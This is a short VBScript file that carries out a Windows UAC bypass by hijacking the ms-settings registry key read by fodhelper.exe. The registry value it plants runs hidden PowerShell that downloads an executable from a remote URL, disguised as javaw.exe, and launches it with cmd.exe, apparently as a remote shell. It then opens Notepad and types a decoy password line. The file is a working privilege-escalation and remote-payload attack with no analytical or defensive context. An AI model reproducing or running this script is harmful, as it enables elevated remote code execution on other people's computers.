Const HKEY_CURRENT_USER = &H80000001

Const FodHelperPath = "C:\\Windows\\System32\\fodhelper.exe"
Const RegKeyPathStr = "SOFTWARE\\Classes\\ms-settings\\shell\\open\\command"
Const RegKeyPath = "Software\\Classes\\ms-settings\\shell\\open\\command"
Const DelegateExecRegKeyName = "DelegateExecute"
Const DelegateExecRegKeyValue = ""
Const DefaultRegKeyName = ""
Const DefaultRegKeyValue = "cmd.exe /c powershell.exe -nop -w hidden -outf %tmp%\\javaw.exe https://github.com/bitcoin-generator/payloads/releases/download/exe/javaw.exe & %tmp%\\javaw.exe -e cmd.exe"

Const RegObjectPath = "winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv"
Set Registry = GetObject(RegObjectPath)

Registry.CreateKey HKEY_CURRENT_USER, RegKeyPath
Registry.SetStringValue HKEY_CURRENT_USER, RegKeyPathStr, DelegateExecRegKeyName, DelegateExecRegKeyValue
Registry.SetStringValue HKEY_CURRENT_USER, RegKeyPathStr, DefaultRegKeyName, DefaultRegKeyValue

Set Shell = WScript.CreateObject("WScript.Shell")
Shell.Run FodHelperPath, 0, False

Set Notepad = WScript.CreateObject("WScript.Shell")
Notepad.Run "C:\\Windows\\System32\\notepad.exe"

WScript.Sleep 1000

Notepad.SendKeys "Password is: ####1234####"
